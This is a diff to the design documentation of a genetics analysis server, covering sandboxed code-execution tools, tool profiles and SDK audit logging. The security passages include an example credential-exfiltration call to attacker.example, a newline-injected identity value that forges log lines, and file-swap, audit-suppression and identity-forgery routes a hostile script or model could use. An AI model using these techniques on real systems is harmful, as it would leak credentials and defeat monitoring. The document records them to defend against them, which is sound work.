@@ -227,6 +227,204 @@ Four tools give the agent direct protein-level annotation, replacing the `web_se
 
 **Exposure decision**: like `get_myvariant_annotations` and `search_mgi`, these are chat-backend only — their names are in the `_mcp_disabled` set in `mcp_server.py`, so they are never registered on the standalone MCP server. Category is `general`, so they survive the `api`/`bigquery`/`rag` profile split (protein annotation is orthogonal to all three), and `get_protein_annotations`, `map_protein_variants` and `search_uniprot` are in the `literature_review` skill's `extra_tools` so subagents doing gene/protein biology can reach them (`get_variant_protein_effect` is not — it answers a genomic-coordinate question rather than a literature one).
 
+### Code execution tools
+
+Tool halves of the sandbox design (`genetics-results-suite-4h6`). The sandbox itself is
+not deployed, so every `run_analysis` call fails at the transport today and
+`read_artifact` has nothing to read in any running service.
+
+| Tool | Description |
+|------|-------------|
+| `run_analysis` | Run one Python script in the sandbox and return what it printed. Takes `code` and an optional `timeout_s` (1–120, default 60) — **and no identity**: the authenticated user and the chat session id are injected by `llm_service._execute_tool`, which strips any same-named key the model emitted first. Chat-backend only; not registered on the MCP server at all |
+| `list_capabilities` | SDK catalogue, one module at a time (`genetics`, `client`, `errors`); omit the argument for an index of module names and their exports. Signatures and docstrings are rendered from the live SDK objects with `inspect`, not from a checked-in copy, so a new dataset function appears without a doc edit and cannot drift. This is what makes the catalogue cost zero per-turn context: the model carries one tool description instead of a signature per data product |
+| `read_artifact` | Read one named file from **this process's local artifacts directory** (`SANDBOX_ARTIFACTS_DIR`). Takes a bare artifact **name** — never a path, never an execution id. Text is returned inline (100k chars, `truncated` flag), binary base64-encoded with its content type; over 4 MiB is refused rather than cut, because a truncated PNG is garbage rather than a short answer. Its description states outright that it **cannot** retrieve a `run_analysis` artifact, matching that tool's `artifacts_note`. Chat-backend only — excluded from MCP server |
+
+**All three are category `orchestration`**, not `general`: they hand work to another
+runtime rather than fetching data, which is what `launch_subagents` is. The category by
+itself excludes nothing — `TOOL_PROFILES` includes `orchestration` in both the `api` and
+`bigquery` profiles, so it reaches three of the five subagent skills — so `subagent.py`
+names all four orchestration tools explicitly:
+`disabled |= {"launch_subagents", "run_analysis", "read_artifact", "list_capabilities"}`.
+That name list, not the category, is what keeps a subagent from executing code, retrieving
+another execution's artifacts or being told how to start one; `tests/test_subagent.py`
+pins it. For `run_analysis` the exclusion is also a correctness point: a subagent has no
+session of its own, and the session is what the per-execution credential is minted against.
+
+**Dropping a tool from the list only stops it being offered — the dispatcher is what
+enforces it.** `subagent.py:_execute_subagent_tool` used to resolve the model's
+`tool_name` against the executor with `getattr`, so any executor attribute could be
+called by naming it, whether or not the skill declared it — and a subagent's task text is
+written by the main agent, which *does* have `run_analysis`. It now refuses (and logs at
+`WARNING`) any `tool_name` absent from the set `_get_tool_definitions(skill)` produced for
+that skill, which covers the local, sandbox and external branches at once. Without it the
+`run_analysis` handler was reachable with a model-supplied `user`/`session_id`, which
+`mint_execution_tokens` would have made the `sub`/`sid` of both per-execution JWTs and of
+every audit record — the forgery the `llm_service` strip exists to prevent, on the same
+tool. `tests/test_subagent.py::TestSubagentDispatchAllowList` pins the refusal, the
+by-name case, and that a declared tool still dispatches.
+
+#### What `run_analysis` returns, and why it is rendered rather than forwarded
+
+`sandbox_client.execute` returns the supervisor's 200 body **unchanged**; the handler
+rebuilds it field by field into `success` / `status` / `output` / `output_truncated` /
+`artifacts` (+ `duration_ms`, `artifacts_omitted`), and on a non-`ok` status adds
+`error`, `error_type`, `traceback`, `limit_exceeded` and a `hint`. Two reasons for the
+rebuild, and neither is that the contract's field set is closed — it is not, an unknown
+`status` renders as itself and counts as not-ok, and an unrecognised `error.type` is a
+label to display rather than something switched on:
+
+- **`execution_id` must not reach the model.** It is the join key for the audit trail and
+  for the manifest chat-backend records against the `jti`/`sid`; putting it in context
+  invites a model-*supplied* one back in, which is what artifact resolution rules out.
+- **A manifest entry is `name`/`size`/`content_type` and nothing else** — no path, no id,
+  no URL — so entries are rebuilt to that shape and malformed ones dropped.
+
+The failure half is deliberately as detailed as the success half: a failing script costs a
+full model roundtrip, and the epic's measurements put a third of all spend in the tail of
+turns with 6+ roundtrips. So the error carries the exception type, the traceback tail, and
+which limit fired, plus a hint that points at `list_capabilities` when the type suggests
+the SDK was called differently from how it is defined.
+
+**Artifacts are listed but not retrievable, and both tools say so.** `run_analysis`'s
+description and its `artifacts_note` state it, and `read_artifact`'s own description now
+carries the same caveat — the two sit in the same chat tool list, and the more specific
+tool promising a fetch is what the note exists to prevent. `read_artifact` in the
+chat-backend process reads a local directory that is not the sandbox's `/scratch` — the
+HTTP proxy is `genetics-results-suite-4h6.52` and does not exist, and
+`SANDBOX_ARTIFACTS_DIR` is set nowhere in the deployment. A model told it can fetch a plot
+spends a roundtrip finding out it cannot.
+
+**The tool-use indicator mirrors the identity strip, and truncates the script.** The
+`*[Using tool: ...]*` chunk and its log line are rendered from the raw `tool_use.input`,
+one layer above the strip in `_execute_tool`, so a model-invented `user` would be logged
+and streamed as if it were a real argument even though it never reaches the handler — and
+in a log join that reads as identity. `_stream_anthropic` drops `user`/`session_id` from
+the displayed input for `run_analysis` (the authenticated pair is already on every line
+via `log_prefix`) and cuts `code` to `_DISPLAY_CODE_CHARS` (400) with a total-length
+marker, so a 256 KiB script does not land in one log line and in the streamed markdown.
+
+**The turn budget is this layer's, not the transport's** (`ToolExecutor._RUN_ANALYSIS_DEADLINE_S`,
+300 s, applied with `asyncio.wait_for`). `sandbox_client` bounds each *attempt* correctly
+and deliberately offers no total, because its per-attempt read deadline is derived from the
+supervisor's own worst-case hold time (120 s queued + `timeout_s` + 15 s margin). The
+attempts sum, though: 5 + 10 + 255, a 60 s `Retry-After`, then another 270 is ~585 s, and
+ten minutes inside one tool call is not a chat turn. 300 s is the smallest cap that never
+truncates a legitimate single attempt (270 s at the maximum `timeout_s`), so raising
+`timeout_s` trades away the retry rather than the run. Exceeding it reports
+`TurnBudgetExceeded` and says the script may still be running — it is not a script failure,
+and neither is `SandboxUnavailable`, which means a deploy left no sandbox for up to ~130 s
+(`strategy: Recreate` plus `terminationGracePeriodSeconds: 130`).
+
+**`SandboxTokenUnavailable` is caught first and by name, and `run_analysis` has no
+`except Exception` at all** — a deliberate departure from the ~40 handlers around it.
+`mint_execution_tokens` raises it (a plain `RuntimeError`) when `SANDBOX_TOKEN_SIGNING_KEY`
+is unset. The house style would catch it and hand the model an ordinary "tool failed";
+that is not a security hole, since the client raises before any request and no credential
+is ever sent, but it turns an operator-visible misconfiguration into a model-visible
+failure the model then retries against a sandbox that can never work. It is reported as
+`SandboxNotConfigured` with `retryable: False`, and `tests/test_code_execution_tools.py`
+pins both the behaviour and — by parsing the handler's AST — the clause ordering.
+
+**Exposure decision**: `run_analysis` and `read_artifact` are in the `_mcp_disabled`
+literal in `mcp_server.py`. This is a security control, not a product decision — the user
+requires that code execution is not reachable via MCP. `run_analysis` additionally has
+**no `register_mcp_tools` block at all**, which is a second registration-layer control
+that no configuration can undo, since `disabled_tools` can only subtract: the entry in
+`_mcp_disabled` is the half an env-driven `disabled_tools` and a future refactor can
+disturb, and it is what would catch a block added later. Both are asserted against the
+*registered tool list* rather than against the constant. Note what does **not** protect
+anything here: `register_mcp_tools` is called with no profile, and `tool_profile=None`
+means no filtering at all, so "the MCP server does not select the `code` profile" is
+precisely the condition under which an unguarded tool would be registered.
+`list_capabilities` is deliberately **not** excluded: what it renders is per-function SDK
+signatures and docstrings, which describe the SDK's shape rather than data, session state
+or any execution, and an exclusion set padded with harmless names stops reading as a
+security control. That surface is genuinely new disclosure to an MCP client — the SDK is
+not the MCP tool surface — and is judged acceptable on its content, not on being visible
+elsewhere. **Module-level** docstrings are stripped from the output for exactly that
+reason: `sdk.__doc__` names the endpoint and credential env vars (`GENETICS_API_URL`,
+`BIGQUERY_API_URL`, `INTERNAL_API_SECRET`) and the services behind them, none of which is
+needed to write a call. The index's one-line module summaries are written in `executor.py`
+(`_SDK_MODULE_SUMMARIES`) rather than sliced out of `__doc__`. What that does **not**
+remove, and the justification must not pretend otherwise: function docstrings describe
+the SDK, so they disclose SDK internals by **category**. The categories are the claim;
+the examples are illustrative, not an enumeration (enumerating them precisely has been
+attempted twice and been incomplete both times):
+
+- the **settings mechanism** — that endpoint URLs come from the environment and cannot be
+  set from a script (`_URL_SETTINGS`, `configure`);
+- **internal service and component names** — `db-api`, the FinnGen LD server, the sandbox;
+- the **execution model** behind an argument — e.g. that `limit=` still runs the full join
+  and `ORDER BY` server-side;
+- **limit and quota values** — the per-execution row cap, the per-query and per-execution
+  byte quotas, and the SDK's own row ceilings.
+
+Rewriting them is a separate decision (it would also drift the generated
+`sandbox/stubs/*.pyi`). Bare `<view>` names are deliberately absent from that list: they
+already appear in MCP tool descriptions, so they are not new disclosure. The dataset
+holding them is never named anywhere this server emits — SQL leaves here unqualified and
+db-api resolves it against its own `DATASET_ID` — so there is nothing to disclose.
+
+**Where the artifact read happens**: `read_artifact` reads the single directory named by
+`SANDBOX_ARTIFACTS_DIR`, and returns "code execution is not enabled" when it is unset —
+which is everywhere today. Chat-backend never sets it; retrieval there proxies over HTTP
+to the sandbox pod, where the filesystem read happens — except that **no such client exists**:
+`genetics-results-suite-4h6.52` owns that proxy hop and the session-scoped name resolution, and
+neither is implemented. Earlier drafts named `4h6.11`, which was the SDK extraction and closed
+without doing either. The allow-list is its own variable on purpose: the
+obvious alternative, `SUBAGENT_ALLOWED_PATHS`, is `/data` in the deployment — the PVC
+holding `chat_history.db` and `llm_config.db` — so wiring artifact reads to it would hand
+the model every conversation in the deployment.
+
+Two structural checks fail closed to "not enabled" before any name is looked at, both in
+`_artifacts_dir()`. Both are **advisory**: they answer about a path string, and the answer
+is stale the moment it returns (see the descriptor check below).
+
+- **the configured directory may not itself be a symlink** (`lstat` + `S_ISLNK`).
+  `_validate_path` resolves both sides, so a symlinked allow-list root makes every file
+  under its target validate. The child uid owns `/scratch/<id>`, so it can `rmdir` its
+  `artifacts` and relink it at another execution's retained artifacts — the cross-session
+  channel the suite's `docs/code-execution-security.md` section 6.4 exists to prevent.
+- **the resolved directory must sit under the hardcoded `_ARTIFACTS_DIR_PREFIX`
+  (`/scratch/`)**. `read_artifact` is registered in the chat backend, so without this the
+  only thing preventing `SANDBOX_ARTIFACTS_DIR=/data` from base64'ing `chat_history.db`
+  back to the model is that nobody sets it. chat-backend has no `/scratch` volume, so the
+  misconfiguration is unreachable rather than merely unmade.
+
+Then, per read: the name check rejects separators, `..`, NUL and absolute paths before
+touching the filesystem, and `skills/sandbox_tools.py:_validate_path` re-checks the
+*resolved* path. **Neither is the enforcing layer** — a script owns its artifacts directory
+and can swap what a name resolves through after the check, at the final component *or at
+the `artifacts` directory itself*, and `_validate_path` cannot see the latter because it
+resolves both sides through the same swapped link and they agree. So after those checks
+nothing is addressed by path again:
+
+- `_open_artifacts_dir()` opens the directory once with `O_RDONLY | O_DIRECTORY |
+  O_NOFOLLOW` and checks **that descriptor** — `readlink("/proc/self/fd/<dirfd>")` must sit
+  under `_ARTIFACTS_DIR_PREFIX` and must not be `" (deleted)"` — rather than re-resolving
+  the path;
+- the artifact is opened **relative to that fd** (`dir_fd=`) with `O_RDONLY | O_NOFOLLOW |
+  O_NONBLOCK`, so a later directory swap changes a name the read no longer uses;
+- regular-file, link-count and content all come from that one fd's `fstat`. `O_NOFOLLOW`
+  refuses a symlink at the final component; `st_nlink != 1` refuses a hardlink, which has
+  nothing to resolve and so passes both path layers while pointing at an out-of-tree inode;
+  `O_NONBLOCK` is what makes the FIFO case reachable at all — `O_RDONLY` on a writerless
+  FIFO blocks in the kernel before `S_ISREG` is tested, so a script could hang the chat
+  backend with one `mkfifo` in its own artifacts directory.
+
+The reported `size` is the payload length, not `st_size`, so a file that grows mid-read
+cannot report a size that disagrees with the bytes returned. Every failure — outside the
+allow-list, symlink, hardlink, FIFO, directory swap, `OSError` — is reported as "not
+found", so probing discloses nothing, and the oversize refusal omits the byte count so it
+is not a size oracle. A `_validate_path` refusal does return measurably faster than one
+from the open, which tells a caller whether a name **it planted** is an out-of-tree
+symlink; a dangling symlink takes the same fast path, so it is not an existence oracle.
+
+**Not implemented**: cross-execution scoping. `read_artifact` takes no session or execution
+argument, so which execution's artifacts are reachable rests entirely on
+`SANDBOX_ARTIFACTS_DIR` pointing at the right directory. Resolving a name against a session
+belongs to `genetics-results-suite-4h6.52` and has not been implemented.
+
 #### Open Targets Platform MCP
 
 | Tool | Description |
@@ -238,7 +436,9 @@ Four tools give the agent direct protein-level annotation, replacing the `web_se
 
 ## Tool Profiles
 
-The chat API supports a `tool_profile` parameter that controls which tool categories are available per request. This enables A/B testing of different tool strategies (API vs BigQuery vs RAG) by sending identical prompts with different profiles.
+The chat API supports a `tool_profile` parameter that controls which tools are available per request. This enables A/B testing of different tool strategies (API vs BigQuery vs RAG vs code execution) by sending identical prompts with different profiles.
+
+Two mechanisms resolve a profile, in `tools/definitions.py`. `TOOL_PROFILES` maps a profile to whole **categories**; `TOOL_PROFILE_TOOLS` maps a profile to an explicit list of tool **names** and takes precedence. The second exists for `code`, whose surface cannot be written as categories — its orchestration tools share a category with `launch_subagents`, which must stay out — and recategorising tools to make it fit was ruled out, since a tool's `category` also decides what the `api` profile advertises and what subagent skills declaring `tool_categories={"general","api"}` can call.
 
 ### Tool categories
 
@@ -249,18 +449,22 @@ Each tool has a `category` field in its definition:
 | `general` | Always available: search_phenotypes, search_genes, lookup_variants_by_rsid, lookup_phenotype_names, list_datasets, get_resource_metadata, get_dataset_display_names, search_scientific_literature, web_search, search_mgi, search_cbioportal, get_protein_annotations, map_protein_variants, get_variant_protein_effect, search_uniprot, create_phewas_plot, get_gene_group_members, normalize_gene_symbols |
 | `api` | Local genetics API tools: credible sets, gene data, colocalization, phenotype report, variant annotations, etc. |
 | `bigquery` | BigQuery SQL tools: query_database, get_database_schema |
-| `orchestration` | Main-agent-only tools: launch_subagents. Excluded from subagent tool sets to prevent recursive launches. |
+| `orchestration` | Main-agent-only tools: launch_subagents, run_analysis, list_capabilities, read_artifact. `subagent.py` drops all four **by name** (the category is in the `api` and `bigquery` profiles, so it is not itself an exclusion), to prevent recursive launches, to keep code execution on the one path that holds the authenticated identity, and to keep a subagent away from another execution's artifacts. |
 
 ### Profile behavior
 
 | `tool_profile` value | Local tools | External tools |
 |----------------------|-------------|----------------|
-| `null` (default) | general + api + bigquery + orchestration | always-on (gnomAD, OT) + RAG |
+| `null` (default) | no filtering at all — every definition | always-on (gnomAD, OT) + RAG |
 | `"api"` | general + api + orchestration | always-on only |
 | `"bigquery"` | general + bigquery + orchestration | always-on only |
 | `"rag"` | general only | RAG only |
+| `"code"` | exactly 7 by name: run_analysis, list_capabilities, read_artifact, search_genes, search_phenotypes, search_scientific_literature, lookup_variants_by_rsid | **none** |
+| any other string | general only (silent fallback, no error) | always-on only |
 
-Always-on external servers (gnomAD, Open Targets from `EXTERNAL_MCP_SERVERS`) are included in every profile except `"rag"`. The RAG server (`RAG_MCP_SERVER`) is only included when `tool_profile` is `"rag"` or unset.
+Always-on external servers (gnomAD, Open Targets from `EXTERNAL_MCP_SERVERS`) are included in every profile except `"rag"` and the explicit-allow-list profiles — a `code` profile that named seven tools would not mean much with ~20 proxied tools appended. The RAG server (`RAG_MCP_SERVER`) is only included when `tool_profile` is `"rag"` or unset.
+
+`code` (genetics-results-suite-4h6.16) **ships dark**: nothing defaults to it, the server-side default is still `null`, and it is selected per request (persisted in `chat_messages.tool_profile`, defaulted per user via the `chat_tool_profile` user setting). Rollback is deleting one dict entry. It deliberately omits `launch_subagents` — the profile measures what one agent does with a sandbox, not what a fan-out does. Its two "search_entities"/"search_literature" names from the bead do not exist in the codebase; the profile ships today's four search tools instead, and the consolidation into merged search tools remains a separate future decision. See `genetics-results-suite/docs/chat-tool-reference.md` § 3 for the resolved per-profile counts.
 
 ## Genetics SDK (`genetics_mcp_server.sdk`)
 
@@ -379,8 +583,31 @@ cBioPortal, myvariant, UniProt), the presentation tools (`create_phewas_plot`,
 not genetics-results data; the second is model-facing summarisation that a script writes for
 itself. `get_phenotype_report` sits next to that second group but does not belong to it: its gene
 scores and tier flags are in no view a script can query, so a script cannot write the report for
-itself — it can only fetch the document results-api serves. See the SDK coverage passage above
-for why that is a discoverability gap rather than an unreachable one.
+itself — it can only fetch the document results-api serves.
+
+**"Not in the SDK" does not mean "not reachable", and this list is not an enforcement boundary.**
+`GeneticsClient` keeps the full `ToolExecutor` on `._executor` — and reaching it needs no client
+at all: `tools/executor.py` is on `sandbox/prune_venv.py`'s `SDK_ALLOWLIST` (it ships because
+`sdk/client.py` imports `ToolExecutor` directly), so a sandboxed script can simply
+`from genetics_mcp_server.tools.executor import ToolExecutor` and construct its own. httpx ships
+too, as the SDK's own transport. The leading underscore is **curation, not enforcement**: it marks
+the executor as outside the curated surface so that a reader or a model does not treat it as a
+recommended entry point, and it should never be cited as a control. The containment boundary, **as
+specified**, is the sandbox's deny-by-default **network egress allow-list** (db-api and results-api
+only) in `genetics-results-suite` `docs/code-execution-security.md` — specified rather than live:
+the sandbox is not deployed, and that policy stays decoration until `genetics-results-suite-4h6.7`
+ships a Deployment carrying the labels it selects.
+
+Reachability therefore divides this list along a different axis than the one that put tools on
+it. The third-party tools **are** genuinely unreachable from a sandboxed script — but for the
+network reason, not the SDK one: no permitted egress target serves myvariant.info, Europe PMC,
+MGI, cBioPortal, UniProt or a web-search API (Perplexity/Tavily), so reaching
+`get_myvariant_annotations` through `._executor` still fails to connect. The presentation tools and `get_phenotype_report` are **reachable**: results-api is a
+permitted target and the sandbox credential is not scoped per route, so `._executor` or a
+hand-rolled httpx call gets them. For those, what the omission costs is the affordance and not
+the data — the discoverability and convenience asymmetry the SDK coverage passage above
+describes, not an availability one. Same list, two different reasons, and the reason is the
+point (`genetics-results-suite-4h6.33`).
 
 `credible_sets`, `summary_stats` and `gene_burden` all return trait **codes** (`I9_CHD`), and
 `search(kind="phenotypes")` is the fuzzy ranked index rather than a lookup, so
@@ -401,16 +628,27 @@ carry — without it a script cannot canonicalise a user-supplied gene list befo
   tool layer's `{"success": False, "error": ...}` exists because a model reads the dict; a
   script author does not check a flag after every call, and an unchecked failure would
   otherwise read as an empty frame.
-- **No knowledge of HTTP required, and no way to redirect it.** Endpoints come from the
-  environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`) and
-  credentials from `INTERNAL_API_SECRET`. Neither `configure()` nor `GeneticsClient()` accepts
-  a URL: the client attaches the internal bearer token to **both** the results-api and the
-  db-api client, so a caller-supplied base URL would be a one-line credential exfiltration
-  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`).
-  `configure()` raises `GeneticsUsageError` on any URL setting. **This is a mitigation, not the
-  answer** — per `genetics-results-suite/docs/code-execution-security.md`, a script that can
-  `import` the SDK can also read `os.environ`, so the sandboxed SDK must eventually carry a
-  short-lived scoped token rather than `INTERNAL_API_SECRET` at all (tasks `.9` / `.14`).
+- **No knowledge of HTTP required, and endpoints are not a parameter.** Endpoints come from
+  the environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`).
+  Credentials depend on where the SDK is running: **inside the sandbox** it attaches the
+  per-execution token pair the supervisor named to the child by path in `SANDBOX_TOKEN_FILE`,
+  per request and bound to the destination's audience, and never `INTERNAL_API_SECRET`
+  (`genetics-results-suite-4h6.44`, landed; `tools/executor.py` `_load_sandbox_tokens` /
+  `_SandboxTokenAuth`); **outside it** — the service processes and local runs — it attaches
+  `INTERNAL_API_SECRET`. The two are mutually exclusive with no fallback, because the shared
+  secret satisfies `is_internal_caller` and is served with no per-execution accounting at all
+  (`genetics-results-suite-0lf`). A pruned (sandbox) install that reaches client construction
+  with neither raises rather than sending requests unauthenticated.
+  Neither `configure()` nor `GeneticsClient()` accepts a URL, since the client credentials
+  every request to whatever base URL it holds
+  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`);
+  `configure()` raises `GeneticsUsageError` on any URL setting. **That is tidiness, not a
+  boundary, and must not be cited as one**: the sandbox child is forked without exec, so the
+  script owns `os.environ` too, and setting `GENETICS_API_URL` before the SDK's first use
+  (the URL reads are `cached_property`, and `sdk/__init__` holds `_client = None` until then)
+  redirects the client and takes the token with it — measured. What contains a hostile script
+  is the sandbox's deny-by-default egress allow-list plus `genetics-results-suite-4h6.55`; the
+  per-execution token's value is that it is short-lived, audience-scoped and **attributable**.
   `_download_url` / `_download_data` are dropped — a script already holds the rows.
 - **No inline row cap.** `ToolExecutor._row_limit` caps region results at 500 to protect the
   model's context window; `GeneticsClient` passes `row_limit=None` to the executor **it
@@ -446,6 +684,156 @@ carry — without it a script cannot canonicalise a user-supplied gene list befo
   on a dedicated background event loop (`sdk/_runner.py`), which keeps the HTTP connection pool
   warm across calls and works from inside an already-running loop. `GeneticsClient` exposes the
   same functions as awaitables.
+- **Every call through the SDK surface is audited — `_executor` is not**
+  (`genetics-results-suite-4h6.12`). Each `GeneticsClient` coroutine
+  method is wrapped at import time (`_instrument` in `sdk/client.py`) so one line per call goes
+  to the `genetics_mcp_server.sdk.audit` logger:
+  `[user=…] [session=…] [execution=…] Executing SDK function: <name> with input: {…} rows: <n>`,
+  plus ` error: <ExceptionType>` when the call raised. It mirrors chat-backend's
+  `[user=…] [session=…] Executing tool: <name> with input: {…}` (`llm_service.py`) rather than
+  reusing its marker, so a query for `Executing tool:` still matches exactly what it did before
+  and script access is a separate, countable thing. The wrapper is instrumented at the client,
+  not at `sdk._make_sync`, so the sync and awaitable surfaces produce one line between them and
+  not two. `functools.wraps` plus an untouched `__signature__` is load-bearing: `list_capabilities`
+  renders the catalogue out of these live objects.
+  - **Argument values are summarised, not logged.** An identifier-shaped string
+    (`[A-Za-z0-9_.:/@|+-]{1,64}` — gene symbols, variant ids, rsids, phenotype codes, regions,
+    view names) is kept verbatim; every other string becomes `<str:len>`, every container
+    `<type:len>`, and `bool`/`int`/`float`/`None` stay as they are. SDK arguments are
+    *script*-authored and unbounded, unlike the schema-bounded tool inputs, so raw logging would
+    let an injected script write chosen text — including forged newline-separated log lines —
+    into the operator's log pipeline, and would copy whole `sql()` bodies into it. Exceptions
+    contribute their **type** only, because `GeneticsUsageError` messages quote arguments back.
+    The charset is anchored with `\Z`, not `$`, which matched before a terminal newline and let
+    `'IL7R\n'` through as identifier-shaped.
+  - **What the summary cannot tell you.** For the two most powerful shapes the line records
+    *that* a read happened, not *what* was read: `sql()` renders as `{'query': <str:N>}` and
+    every batch argument (`variants=[…]`, `phenotypes=[…]`, `codes=[…]`) as `<list:N>`. So for
+    arbitrary SQL and for batch calls the trail does **not** answer
+    genetics-results-suite `docs/code-execution-security.md` §6.2's "what did that script
+    read?" — it answers only "how much". Logging the raw query would reintroduce exactly the
+    injection the summary exists to prevent, so it is not the fix; what would close it is a
+    bounded, allow-list-derived summary — the bare `<view>` names a query
+    references, emitted only when the extracted name is on a shipped view allow-list, so no
+    attacker-chosen text can reach the line. This repo has no such allow-list today
+    (`tools/sql_safety.py` allow-lists *values*, not views; the view list is db-api's), so the
+    gap is stated rather than papered over.
+  - **A call refused before it reached the executor is not recorded as a read.** Local
+    argument validation (`_one_of`, `_reject`, `parse_region` — every `GeneticsUsageError` in
+    the module) raises before any upstream call, so it emits
+    `Rejected SDK function: <name> with input: {…} error: <ExceptionType>` with **no `rows:`
+    field** and does not parse as a data access. The refusal path is the cheap one, so
+    recording it in the read shape both inflated the volume below and polluted the answer to
+    "what did that script read?" with calls that read nothing.
+  - **Only refusals are bounded — 1000 per process (`_AUDIT_MAX_REFUSALS`) — and a call that
+    reached the executor is never dropped.** The two are different primitives. A refusal costs
+    the script nothing (no socket, no upstream: 1000 were driven through in ~50ms), so it is
+    the flooding primitive and is capped, after which one `SDK audit truncated after 1000
+    records` notice is emitted and further refusals go unrecorded. A call that reached the
+    executor paid an HTTP round-trip to db-api and is charged against the byte and row quotas
+    the rest of the sandbox's resource controls rely on, so it cannot be driven at flood
+    rates — and capping it is not a flood control but a **suppression primitive**: an earlier
+    revision counted both against one ceiling, so 1001 cheap refusals bought silence for every
+    genuine `sql()` read that followed. The budget is keyed on a **module-level process
+    counter and on nothing the script can write**; keying it on `SANDBOX_EXECUTION_ID` gave a
+    script a reset button (a loop rewriting that variable restored the flood at 19,622
+    lines/s, higher than before the ceiling existed). Measured after the change, with the
+    execution id rotated on every call: 1001 lines / ~206 KB total, then a flat zero. The cost
+    is that a supervisor reusing one process across executions shares one refusal budget;
+    fixing that belongs on the supervisor's side of the fd (`4h6.45`), not here.
+  - **The meta channel is bounded too, and carries no script-chosen text**
+    (`_AUDIT_MAX_META_RECORDS`, `_emit_meta`). The truncation notice used to interpolate
+    `[execution=…]` — i.e. whatever the script last wrote to `SANDBOX_EXECUTION_ID` — and
+    fired once per execution id, so rotating the id produced 3,873 notices in one second.
+    Statements about the channel are now capped per process and are literals.
+  - **A cancelled call is not filed as a failed read.** `asyncio.CancelledError` ends the line
+    with a bare ` cancelled` instead of ` error: CancelledError`, so a shutdown or a timeout
+    does not read back as a failure.
+  - **Logging can never break the call.** Every emit goes through `_emit`, which swallows
+    handler exceptions (a full disk, a supervisor's closed fd) so a successful data access is
+    never turned into a failure; the first failure is reported on `sys.__stderr__` — not
+    `sys.stderr`, which a sandboxed script may have rebound — and counted in
+    `_audit_emit_failures`. The audit logger's level is pinned to `INFO` at import, because a
+    logger with no level of its own inherits root's and a host at `WARNING` would have
+    discarded this entire control with no error.
+  - **`_executor` calls are NOT audited.** `genetics.get_client()._executor.<method>()`
+    returns the same data and emits nothing, and `tools/executor.py` ships in the sandbox
+    image, so a script can build its own executor in one import (`genetics-results-suite-4h6.33`).
+    The underscore is curation, not enforcement. Closing this means instrumenting
+    `ToolExecutor` itself, which is a much larger change: every MCP tool call goes through
+    those same methods, so it would need chat-backend's existing `Executing tool:` line
+    suppressed or deduplicated against the new one. Until then this control reads "audited if
+    you use the recommended surface", never "unbypassable".
+  - **Identity is `unknown` today**, and the line says so rather than omitting the fields. The
+    values are the sandbox token's `sub`/`sid`/`jti` claims, read from `SANDBOX_USER`,
+    `SANDBOX_SESSION_ID` and `SANDBOX_EXECUTION_ID`; delivering the token to the child is
+    `genetics-results-suite-4h6.43`, and reading and sending it is `-4h6.44`.
+  - **The identity fields are sanitised like any other script-authored value**
+    (`_audit_identifier`). They come from the environment, which the audited script writes, so
+    they get the same `[A-Za-z0-9_.:/@|+-]{1,64}\Z` charset and length cap as an argument, and
+    anything failing it is replaced with the literal `<invalid>` — replaced, never truncated,
+    because truncating `admin@finngen.fi.attacker.test` to a prefix manufactures a different,
+    entirely plausible identity. This is a defect on any architecture, not a sandbox-only one:
+    interpolated raw, `SANDBOX_USER = "alice\n[user=admin@finngen.fi"` produced a line that
+    **this repo's own parser** (`analyze_conversations.py`) read back as
+    `user='admin@finngen.fi'`, and a 100 KB `SANDBOX_USER` put 100,431 bytes on the stream for
+    one legitimate call (197 bytes after the fix). Sanitising bounds the damage; it does not
+    make the values true — only the supervisor stamping them does.
+  - **Without a dedicated fd these records are NOT a tamper-evident audit trail, and they say
+    so.** In-process the record lands wherever `Executing tool:` lands; in the sandbox the SDK
+    runs in a forked child that configures no logging, so a handler is installed on first use.
+    Only the `GENETICS_SDK_AUDIT_FD` path is trustworthy: the supervisor holds the write end,
+    and the SDK switches off propagation so inherited handlers cannot copy the records back
+    onto a shared stream. Every other shape shares a stream with the audited script — the same
+    stderr it writes to with `print(..., file=sys.stderr)` — and per-value escaping is
+    irrelevant when the writer owns the stream: a forged line parses cleanly through
+    `analyze_conversations.py` and can name any user and session. So when no fd is configured
+    the SDK emits `SHARED_STREAM_WARNING` once per process on
+    `genetics_mcp_server.sdk.audit.meta` (a child logger: it reaches the same sink but must not
+    parse or count as a data access), and the analyzer repeats that warning in any report built
+    from such a log. Handler installation is keyed on the **pid**, not a one-shot flag, because
+    both the module's state and the parent's handlers survive `fork()` — the earlier one-shot
+    guard made the fd path unreachable in exactly the shape it exists for. **Nothing sets that
+    fd today, and nothing forwards the child's stream to the pod's stdout for the cluster's
+    logging agent: the supervisor does not exist yet (`4h6.39`, with the fd and the forwarding
+    in `4h6.45`), so every record emitted today is on the untrusted side of this line.**
+  - **These records are a best-effort observability signal, not a security control, and no
+    in-process change can make them one.** The audited script shares the address space with
+    the code that emits them, so every control in `sdk/client.py` is reachable from the code it
+    constrains — each of these was demonstrated: forgery by calling
+    `logging.getLogger("genetics_mcp_server.sdk.audit").info(...)` directly, or `os.write` to
+    the fd number the SDK necessarily leaves in the environment for the child to find;
+    suppression of real records via `logger.disabled`, `setLevel`, `addFilter` or
+    `removeHandler`; and reset of any budget keyed on a script-writable variable. The bounds
+    and sanitisation above make the channel honest and stop it being actively harmful; they do
+    not bound what a hostile script can claim, hide or emit. So the trail describes what a
+    well-behaved script did, and nothing — a review, an incident write-up, this document —
+    may cite it as evidence under an assumption of compromise. The controls that hold against a
+    hostile script are outside the process: the sandbox network policy, db-api's own
+    `endpoint_access` lines, and the byte/row quotas.
+  - **What `genetics-results-suite-4h6.45` owes, stated as a specification** (also in the
+    `sdk/client.py` header, so the ticket inherits a design rather than a puzzle):
+    1. **The supervisor reads the fd and enforces on the read end.** The child holds only the
+       write end; the rate cap, byte cap and per-line length cap are applied by the supervisor
+       as it reads, where no code in the child can raise, reset or bypass them, and overrun is
+       the supervisor's decision to record and act on.
+    2. **The supervisor stamps identity.** `[user=…] [session=…] [execution=…]` must be written
+       by the process holding the sandbox token, from its `sub`/`sid`/`jti` claims. The child
+       must not be asked to state who it is.
+    3. **The child's framing is untrusted input.** The supervisor parses each line, rejects
+       what it cannot parse, and re-emits it in its own framing.
